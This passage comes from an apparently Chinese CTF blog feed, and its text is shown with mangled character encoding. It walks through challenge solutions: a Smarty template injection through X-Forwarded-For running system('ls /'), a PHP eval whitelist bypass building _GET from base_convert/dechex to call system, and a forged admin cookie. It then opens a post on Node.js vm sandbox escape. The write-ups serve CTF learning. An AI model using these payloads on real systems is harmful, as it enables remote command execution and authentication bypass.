alt="scandir1"></p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>è¿›å»å‘ç°æ˜¯ä¸ªå’Œ<code>IP</code>æœ‰å…³çš„é¡µé¢ï¼Œå³ä¸Šè§’æ˜¾ç¤ºäº†æˆ‘ä»¬çš„å…¬ç½‘<code>IP</code>ï¼š</p><p><img src="/img/web11-1.png" alt="web11-1"></p><p>ä¸‹é¢ç”šè‡³æœ‰è¯·æ±‚åŒ…çš„å®Œæ•´ä¿¡æ¯ï¼š</p><p><img src="/img/web11-2.png" alt="web11-2"></p><p>æ—¢ç„¶å®ƒè·å–äº†<code>IP</code>é‚£å¤§æ¦‚ç‡å¯ä»¥æƒ³åˆ°<code>XFF</code>ä¼ªé€ ï¼ŒæŠ“åŒ…è¯•è¯•çœ‹ï¼š</p><p><img src="/img/web11-3.png" alt="web11-3"></p><p>ç¡®å®æ˜¯è¿™æ ·ï¼Œä½†æœ‰ä»€ä¹ˆç”¨ï¼Ÿè¿™é¢˜æ˜æ˜¾ä¸æ˜¯åˆ©ç”¨XFFçš„SQLæ³¨å…¥ï¼Œæƒ³åˆ°ä¹‹å‰åšè¿‡ä¸€é“å¥½åƒå«<code>cookie is so stable</code>çš„é¢˜ï¼Œé€šè¿‡æ¨¡æ¿æ³¨å…¥è§£é¢˜ï¼Œè¯•è¯•çœ‹ï¼š</p><p><code>X-Forwarded-For:&#123;7*7&#125;</code></p><p><img src="/img/web11-5.png"></p><p>è¿˜çœŸæ˜¯ï¼Œè€è§„çŸ©å…ˆåˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼Œå†è¯•è¯•:<code>X-Forwarded-For:a&#123;*comment*&#125;b</code></p><p><img src="/img/wweb11-6.png" alt="wweb11-6"></p><p>åº”è¯¥æ˜¯<code>Smarty</code>æ¨¡æ¿ï¼Œä¸ªäººè®¤ä¸ºè¿™ä¸ªæ¨¡æ¿æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œåœ¨<code>XFF</code>ç›´æ¥è¾“å…¥ï¼š<code>&#123;system(&#39;ls /&#39;)&#125;</code>å»æ‰¾<code>flag</code>ï¼Œç„¶åç›´æ¥<code>cat</code>è¯»å°±è¡Œäº†ã€‚</p><p>å…¶å®è¿™é¢˜åº•ä¸‹æœ‰è¡Œå°å­—æç¤ºäº†ï¼š<code>Build With Smarty !</code></p><p><img src="/img/smarty1.png" alt="smarty1"></p><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><p>çœ‹é¢˜ç›®å¯èƒ½è·Ÿ<code>MD5</code>æœ‰å…³ï¼Ÿ</p><p>ç›´æ¥ç»™äº†æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123; <span class="hljs-comment">//GETä¼ å‚ï¼Œcä¸è¢«å®šä¹‰å°±é«˜äº®æºç </span><br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<span class="hljs-comment">//åé¢ä¸¤ä¸ªä¾é \æ¥è½¬ä¹‰</span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é¢˜èŠ±äº†å¾ˆé•¿æ—¶é—´æ²¡è§£å‡ºæ¥ï¼Œå› ä¸ºä¸€ç›´åœ¨æƒ³æ€ä¹ˆå»ç»•è¿‡é»‘åå•å’Œæ­£åˆ™åŒ¹é…å»æ‰§è¡Œå‘½ä»¤ï¼Œåé¢çœ‹äº†<code>wp</code>æ‰çŸ¥é“è¦åˆ©ç”¨ç»™çš„å‡½æ•°å»åšï¼Œå‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« <code>https://www.cnblogs.com/20175211lyz/p/11588219.html</code></p><p><code>https://www.anquanke.com/post/id/220813#h3-2</code></p><h4 id="æ€è·¯ä¸€"><a href="#æ€è·¯ä¸€" class="headerlink" title="æ€è·¯ä¸€"></a>æ€è·¯ä¸€</h4><p>ä¸»è¦æ˜¯<code>base_convert()</code>å‡½æ•°å’Œ<code>dechex</code>å‡½æ•°çš„ä½¿ç”¨ï¼š</p><p><img src="/img/baseconvert.png" alt="baseconvert"></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸œè¥¿çš„èŒƒå›´æ˜¯<code>2-36</code>ï¼Œæ­£å¥½è¦†ç›–äº†<code>0-9,a-z</code>ã€‚<code>dechex</code>å‡½æ•°ç”¨äºå°†åè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚å®ƒæ¥å—ä¸€ä¸ªåè¿›åˆ¶æ•°ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªè¡¨ç¤ºç›¸åº”åå…­è¿›åˆ¶æ•°çš„å­—ç¬¦ä¸²ã€‚</p><p>å…ˆçœ‹<code>wp</code>æ€ä¹ˆå†™çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">&quot;hex2bin&quot;</span><br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">&quot;5f474554&quot;</span><br><span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&quot;5f474554&quot;</span>) =&gt; <span class="hljs-variable">$pi</span>=<span class="hljs-string">&quot;_GET&quot;</span>   <span class="hljs-comment">//hex2binå°†ä¸€ä¸²16è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span><br>(<span class="hljs-variable">$$pi</span>)&#123;pi&#125;((<span class="hljs-variable">$$pi</span>)&#123;abs&#125;) =&gt; (<span class="hljs-variable">$_GET</span>)&#123;pi&#125;(<span class="hljs-variable">$_GET</span>)&#123;abs&#125;  <span class="hljs-comment">//&#123;&#125;å¯ä»¥ä»£æ›¿[]</span><br></code></pre></td></tr></table></figure><p><code>payload</code>ï¼š</p><p><code>/index.php?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$pi)&#123;1&#125;)&amp;0=system&amp;1=&lt;command&gt;</code></p><p>å› ä¸ºå¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ï¼šå…ˆåˆ©ç”¨<code>base_convert</code>å‡½æ•°è½¬å‡ºä¸€ä¸ª<code>hex2bin</code>ï¼Œå†åˆ©ç”¨<code>dechex</code>è½¬å‡ºä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå‰å‡½åå‚ç»„åˆè½¬å‡º<code>_GET</code>.</p><p><code>base_convert</code>é‡åˆ°<code>36</code>è¿›åˆ¶æ—¶ä¼šè½¬æ¢æˆå°å†™å­—æ¯ï¼Œä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼ša</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(A,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼š10ï¼Œè½¬å›å»å¹¶ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</span><br></code></pre></td></tr></table></figure><p>åé¢å°±å¾ˆå¥½ç†è§£äº†ï¼Œå®ƒä¼šç›´æ¥<code>eval</code>è¿‡æ»¤åçš„<code>c</code>ã€‚æ‰§è¡Œå<code>c</code>&#x3D;<code>$pi</code>&#x3D;<code>_GET</code>ï¼Œ<code>$$pi</code>&#x3D;<code>$_GET</code>ã€‚å†åˆ©ç”¨$_GET{0}($_GET{1})å»æ‰§è¡Œå‡½æ•°å°±å¥½ã€‚å³ä½¿<code>[]</code>è¢«è¿‡æ»¤äº†ä»å¯ä»¥ä½¿ç”¨<code>&#123;&#125;</code>ç»•è¿‡ã€‚æ„é€ å®Œ<code>_GET</code>åè¿˜éœ€è¦å¼•å…¥ä¸€ä¸ªå˜é‡æ¥ä½œä¸ºå‡½æ•°æ‰§è¡Œ, ä¾‹å¦‚ <code>$a()</code>, æˆ‘ä»¬ç”¨ <code>$pi</code> ä»¥ç»•è¿‡ç™½åå•çš„æ£€æµ‹ã€‚</p><h4 id="æ€è·¯äºŒ"><a href="#æ€è·¯äºŒ" class="headerlink" title="æ€è·¯äºŒ"></a>æ€è·¯äºŒ</h4><p>åˆ©ç”¨<code>getallheaders</code>å»è§£é¢˜ï¼š</p><p><code>payload:/index.php?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code>æ³¨æ„è¿™ä¸ª<code>getallheadersçš„ç”¨æ³•</code></p><p>é¦–å…ˆä¸ºä»€ä¹ˆæ˜¯30è¿›åˆ¶(å‚è€ƒäº†<code>bfengj</code>å¸ˆå‚…çš„æ–‡ç« )ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">Warning<br>ç”±äºä½¿ç”¨å†…éƒ¨çš„ â€œdoubleâ€ æˆ– â€œ<span class="hljs-attribute">float</span>â€ ç±»å‹ï¼Œ<span class="hljs-built_in">base_convert</span>() çš„æ“ä½œå¯èƒ½ä¼šå¯¼è‡´å¤§æ•°å€¼ä¸­çš„ç²¾åº¦ä¸¢å¤±ã€‚è¯·å‚è§æœ¬æ‰‹å†Œçš„ æµ®ç‚¹æ•° ç« èŠ‚ä»¥ä¾¿è·å¾—æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚<br><br>ç»è¿‡å¤§å¸ˆçˆ¶ä»¬çš„æµ‹è¯•ï¼Œ<span class="hljs-number">31</span>-<span class="hljs-number">36</span>è¿›åˆ¶çš„getallheaderséƒ½ä¼šå‡ºç°ç²¾åº¦ä¸¢å¤±å¯¼è‡´ä¸èƒ½æˆåŠŸå¾—åˆ°getallheadersï¼Œ<span class="hljs-number">30</span>è¿›åˆ¶çš„æ—¶å€™å°±å¯ä»¥äº†ã€‚<br></code></pre></td></tr></table></figure><p><code>system(getallheaders()&#123;1&#125;)</code>ï¼Œè¿™ä¸ª<code>&#123;1&#125;</code>åº”è¯¥æ˜¯è·å–åŒ…å¤´ä¸º<code>1</code>éƒ¨åˆ†çš„å€¼ï¼Œæˆ‘è¯´<code>åº”è¯¥</code>æ˜¯å› ä¸ºæ²¡æ‰¾åˆ°ç›¸å…³æ–‡ç« è¯´è¿™ä¸ªä¸œè¥¿ã€‚ã€‚å¤§å¤šç›´æ¥ç»™äº†<code>payload</code>(ä¼°è®¡å¸ˆå‚…ä»¬è§‰å¾—è¿™é—®é¢˜æ²¡å¿…è¦è¯´ï¼Œå“ˆå“ˆ)ã€‚æˆ‘è‡ªå·±å°è¯•æŠŠ<code>1</code>æ”¹æˆåˆ«çš„å†æ”¹å¯¹åº”åŒ…å¤´ä¹Ÿèƒ½æ‰§è¡Œå‘½ä»¤(æˆ‘è¿™é‡Œæ”¹æˆäº†<code>333</code>)ï¼š</p><p><img src="/img/lovemath1.png" alt="lovemath1"></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="/img/kookie1.png" alt="kookie1"></p><p>è®©æˆ‘ä»¬ä»¥<code>admin</code>çš„èº«ä»½ç™»å½•ï¼Œç„¶åæç¤ºå·²ç»æœ‰<code>cookie/monster</code>è¿™ä¸¤ä¸ªè´¦æˆ·äº†ï¼Œé€‰<code>cookie</code>è¿™ä¸ªç”¨æˆ·åå†éšä¾¿è¾“ä¸ªå¯†ç ç™»å½•ä¸€ä¸‹çœ‹çœ‹ï¼š</p><p><img src="/img/kookie2.png" alt="kookie2"></p><p>å¯ä»¥çœ‹åˆ°è¡Œä¸º&#x2F;ç”¨æˆ·å&#x2F;å¯†ç éƒ½æ˜¯ç›´æ¥ä»¥<code>GET</code>æ–¹å¼ä¼ è¿‡å»çš„(æºç ä¹Ÿæœ‰ç›¸åº”æç¤º)ï¼Œé‚£æˆ‘ä»¬ç›´æ¥æŠŠ<code>username</code>åé¢çš„ä¸œè¥¿åˆ æ‰çœ‹çœ‹èƒ½å¦ç™»å½•ï¼š</p><p><code>/?action=login&amp;username=cookie</code></p><p>è¿™ä¸ªç™»ä¸ä¸Šå»ï¼Œæ¢<code>monster</code>è¯•è¯•ï¼š</p><p><code>/?action=login&amp;username=monster</code></p><p>ç™»å½•æˆåŠŸï¼š</p><p><img src="/img/kookie4.png" alt="kookie4"></p><p>æŠ“åŒ…çœ‹çœ‹<code>cookie</code>:</p><p><img src="/img/kookie5.png" alt="kookie5"></p><p>å‘ç°<code>cookie</code>å­—æ®µä¸­<code>username=monster</code>ï¼Œç›´æ¥æ”¹æˆ<code>admin</code>:</p><p><img src="/img/kookie6.png" alt="kookie6"></p><p>åº”è¯¥æ˜¯æ–°ç”Ÿèµ›çš„é¢˜ç›®</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆè¯†vmæ²™ç®±é€ƒé€¸</title>
    <link href="/2023/10/24/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/10/24/VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„å­¦ä¹ ç¬”è®°ï¼Œæ²¡å•¥å«é‡‘é‡ã€‚</p><span id="more"></span><hr><h3 id="0x01-åŸºç¡€çŸ¥è¯†"><a href="#0x01-åŸºç¡€çŸ¥è¯†" class="headerlink" title="0x01 åŸºç¡€çŸ¥è¯†"></a>0x01 åŸºç¡€çŸ¥è¯†</h3><p><code>JavaScript</code>å’Œ<code>Nodejs</code>ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</p><p>ç®€å•è¯´å°±æ˜¯<code>JavaScript</code>ç”¨äºæµè§ˆå™¨å‰ç«¯ï¼Œ<code>Nodejs</code>ç”¨åœ¨åç«¯(æœåŠ¡å™¨)ã€‚</p><p>ä»€ä¹ˆæ˜¯æ²™ç®±(<code>sandbox</code>)ï¼Ÿ</p><p>ç”¨äºéš”ç¦»æ¶æ„ä»£ç çš„ç¯å¢ƒï¼Œæ¶æ„ä»£ç å³ä½¿åœ¨æ²™ç®±ä¸­è¢«æ‰§è¡Œä¹Ÿæ²¡å¤šå¤§å±å®³ã€‚</p><p>åœ¨<code>Nodejs</code>ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥<code>vm</code>æ¨¡å—æ¥åˆ›å»ºä¸€ä¸ªâ€œæ²™ç®±â€ï¼Œä½†å…¶å®è¿™ä¸ª<code>vm</code>æ¨¡å—çš„éš”ç¦»åŠŸèƒ½å¹¶ä¸å®Œå–„ï¼Œè¿˜æœ‰å¾ˆå¤šç¼ºé™·ï¼Œå› æ­¤<code>Node</code>åç»­å‡çº§äº†<code>vm</code>ï¼Œä¹Ÿå°±æ˜¯ç°åœ¨çš„<code>vm2</code>æ²™ç®±ï¼Œ<code>vm2</code>å¼•ç”¨äº†<code>vm</code>æ¨¡å—çš„åŠŸèƒ½ï¼Œå¹¶åœ¨å…¶åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚</p><h3 id="0x02-Nodeå¯ä»¥æŠŠå­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œ"><a href="#0x02-Nodeå¯ä»¥æŠŠå­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œ" class="headerlink" title="0x02 Nodeå¯ä»¥æŠŠå­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œ"></a>0x02 Nodeå¯ä»¥æŠŠå­—ç¬¦ä¸²å½“ä»£ç æ‰§è¡Œ</h3><p>ç”¨ä¸€äº›å‚è€ƒæ–‡ç« ä¸­çš„æ —å­(åœ¨<code>.js</code>æ‰€åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>age.txt</code>)ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p>åˆ›å»º<code>hello,js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>) <span class="hljs-comment">//requireå‡½æ•°å¼•å…¥Node.jsçš„fsæ¨¡å—ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å¸¸é‡fs</span><br><br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-comment">//ä½¿ç”¨fsæ¨¡å—çš„readFileSyncæ–¹æ³•åŒæ­¥è¯»å–åä¸ºage.txtçš„æ–‡ä»¶ï¼Œå¹¶å°†æ–‡ä»¶å†…å®¹ä»¥UTF-8ç¼–ç çš„å½¢å¼å­˜å‚¨åœ¨contentå˜é‡ä¸­ã€‚</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<span class="hljs-comment">//æ‰“å°content</span><br><br><span class="hljs-built_in">eval</span>(content)<span class="hljs-comment">//æ‰§è¡Œï¼</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<span class="hljs-comment">//æ‰“å°age</span><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var age <span class="hljs-operator">=</span> <span class="hljs-number">18</span><br><span class="hljs-number">18</span><br></code></pre></td></tr></table></figure><p><code>age.txt</code>ä¸­çš„<code>var age = 18</code>è¢«å½“æˆå­—ç¬¦ä¸²æ‰§è¡Œäº†ã€‚</p><p>ä¸è¿‡è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼šå¦‚æœåœ¨å½“å‰ä½œç”¨åŸŸ(ä¹Ÿå«ä¸Šä¸‹æ–‡)ä¸‹å·²ç»æœ‰äº†ä¸ª<code>age</code>ï¼Œé‚£ä¹ˆä¼šæŠ¥é”™ã€‚ä¸¾ä¸ªæ —å­:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><br><span class="hljs-keyword">let</span> content = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;age.txt&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">let</span> age = <span class="hljs-number">12</span> <br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(content)<br><br><span class="hljs-built_in">eval</span>(content)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(age)<br><span class="hljs-comment">//ç»“æœï¼š</span><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">18</span><br><span class="hljs-attr">undefined</span>:<span class="hljs-number">1</span><br><span class="hljs-keyword">var</span> age = <span class="hljs-number">18</span><br>    ^<br><br><span class="hljs-title class_">SyntaxError</span>: <span class="hljs-title class_">Identifier</span> <span class="hljs-string">&#x27;age&#x27;</span> has already been declared<br></code></pre></td></tr></table></figure><p>ä½œç”¨åŸŸæ˜¯ä»€ä¹ˆï¼Ÿä¸¾ä¸ªæ —å­ï¼š</p><p><code>bye.js</code>:</p><p><code>var age = 20</code></p><p><code>hello.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bye&quot;</span>) <span class="hljs-comment">//requireå‡½æ•°å¼•å…¥äº†å½“å‰ç›®å½•ä¸‹çš„åä¸ºbyeçš„æ¨¡å—ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™å¸¸é‡a</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-property">age</span>)<br><br><span class="hljs-comment">//ç»“æœï¼š</span><br><span 